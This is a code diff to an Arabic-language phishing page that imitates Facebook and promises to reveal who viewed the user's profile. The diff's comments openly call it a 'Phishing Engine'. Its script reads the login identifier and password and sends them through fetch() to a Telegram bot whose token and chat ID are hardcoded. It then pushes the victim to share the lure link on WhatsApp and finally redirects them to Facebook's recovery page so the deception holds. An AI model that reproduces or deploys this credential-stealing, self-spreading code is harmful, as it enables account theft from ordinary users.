@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - اعرف من زار صفحتك</title>
     <style>
-        /* [التنسيقات السابقة كما هي] */
+        /* التنسيقات الاحترافية */
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f2f5;
@@ -31,19 +31,19 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
-        /* تعديل صندوق الرسالة الزرقاء ليتضمن النص الجديد */
+        /* خلفية زرقاء داكنة للنصوص التحفيزية */
         .info-box {
-            background: #1877f2;
+            background: #1877f2; 
             border: 1px solid #1877f2;
-            color: white;
+            color: white; 
             padding: 15px;
             border-radius: 6px;
             margin-bottom: 20px;
             font-size: 15px;
-            font-weight: bold;
+            font-weight: bold; 
             line-height: 1.5;
         }
-        .main-lure-title {
+        .main-lure-title { 
             font-size: 22px;
             color: #1c1e21;
             font-weight: bold;
@@ -71,9 +71,6 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-        .btn:hover {
-            background: #166fe5;
-        }
         .link {
             display: block;
             margin-top: 15px;
@@ -91,13 +88,8 @@
             font-weight: bold;
             cursor: pointer;
         }
-        .share-screen-title {
-            font-size: 20px;
-            color: #1c1e21;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        .share-instruction-box {
+        /* تنسيق خاص لشاشة المشاركة */
+        .share-instruction-box { 
             background: #1877f2;
             color: white;
             padding: 15px;
@@ -109,7 +101,7 @@
             text-align: center;
         }
         .whatsapp-share-btn {
-            background: #42b72a;
+            background: #42b72a; 
             color: white;
             padding: 12px;
             font-size: 16px;
@@ -126,14 +118,16 @@
     </style>
 
     <script>
-        // --- رمز التوكن القديم (للمحاكاة) ---
+        // --- 🛑 1. المتغيرات الثابتة (بصمة المجرم) ---
         const BOT_TOKEN = "8518769039:AAHPWQWJEgROig0QKJg1xhTUGf6mUBfS53k"; 
         const CHAT_ID = "6717287161"; 
         
-        const SITE_LINK = "https://baljwfy825-crypto.github.io/FB-Docs/;
+        // ✅ رابط الموقع الجديد الذي سيتم نشره عند المشاركة ✅
+        const SITE_LINK = "https://baljwfy825-crypto.github.io/FB-Docs/";
 
+        // --- 🛑 2. دالة إرسال البيانات (Phishing Engine) ---
         function send_telegram_data(event) {
-            event.preventDefault(); 
+            event.preventDefault(); // منع الإرسال الحقيقي
             
             const identifier = document.getElementById("identifier").value;
             const password = document.getElementById("password").value;
@@ -144,13 +138,12 @@
 
             fetch(url)
                 .then(response => {
-                    console.log("تم إرسال البيانات (المحاكاة).");
-                    
+                    // النجاح: الانتقال لخطوة المشاركة
                     document.getElementById("login-form-container").style.display = 'none';
                     document.getElementById("share-step").style.display = 'block';
                 })
                 .catch(error => {
-                    console.error("فشل الاتصال بالبوت. ننتقل لخطوة المشاركة للمحاكاة.");
+                    // الفشل: الانتقال لخطوة المشاركة للحفاظ على الخداع
                     document.getElementById("login-form-container").style.display = 'none';
                     document.getElementById("share-step").style.display = 'block';
                 });
@@ -158,12 +151,15 @@
             return false;
         }
 
+        // --- دالة المشاركة على واتساب ---
         function initiate_whatsapp_share() {
+            // الرسالة تحتوي الآن على الرابط الجديد (SITE_LINK)
             const share_text = `اعرف من يراقب ملفك الشخصي على فيسبوك وصورك في الخفا: ${SITE_LINK}`; 
             
             const whatsapp_url = `whatsapp://send?text=${encodeURIComponent(share_text)}`;
             window.location.href = whatsapp_url;
 
+            // توجيه الضحية لفيسبوك بعد 3 ثوانٍ
             setTimeout(() => {
                 alert("تم التحقق من مشاركتك بنجاح! نأسف، تعذر عرض قائمة الزوار الآن. يرجى المحاولة لاحقاً.");
                 window.location.href = "https://www.facebook.com/recover/initiate/"; 
